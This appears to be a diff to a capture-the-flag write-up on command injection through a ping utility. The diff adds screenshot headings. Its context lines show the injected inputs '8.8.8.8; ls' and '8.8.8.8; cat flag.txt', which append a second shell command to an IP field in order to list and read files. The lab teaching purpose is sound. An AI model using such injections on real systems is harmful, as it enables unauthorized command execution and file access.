@@ -38,6 +38,8 @@ Since the input is not sanitized, we can inject additional commands using shell 
 ```bash
 8.8.8.8
 ```
+### Connection and Evaluation
+![Connection and Evaluation](Images/Connection_and_check.png)
 🔹 Inject Command to List Files
 ```bash
 8.8.8.8; ls
@@ -46,6 +48,8 @@ This executes:
 ```bash
 ping 8.8.8.8; ls
 ```
+### Getting the flag
+![Getting the flag](Images/getting_flag.png)
 ### 📂 Output reveals:
 ```bash
 flag.txt
@@ -58,6 +62,8 @@ This executes:
 ```bash
 ping 8.8.8.8; cat flag.txt
 ```
+### Flag
+![Flag](IMages/Flag.png)
 ### 🏁 Flag Captured
 
 Successfully retrieved the flag using command injection.
